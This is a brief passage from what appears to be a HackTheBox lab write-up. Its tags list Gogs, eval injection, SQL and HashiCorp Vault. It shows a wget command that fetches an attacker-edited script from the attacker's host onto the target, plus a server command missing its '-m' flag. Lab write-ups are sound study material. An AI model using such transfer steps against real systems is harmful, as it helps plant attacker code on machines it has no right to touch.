...
date: 2020-01-04
category: [HackTheBox]
tags: [HackTheBox, HTB, API, curl, Gogs, eval, injection, Python, wget, SQL, Vault, OTP, HashiCorp]
header:
...
The `dbtest.py` file was edited on the local attacking system and then transferred to the remote system using `wget http://10.10.14.22/dbtest.py -O dbtest.py` (on the remote system's CLI) and `python3 http.server 80` (on the local system).
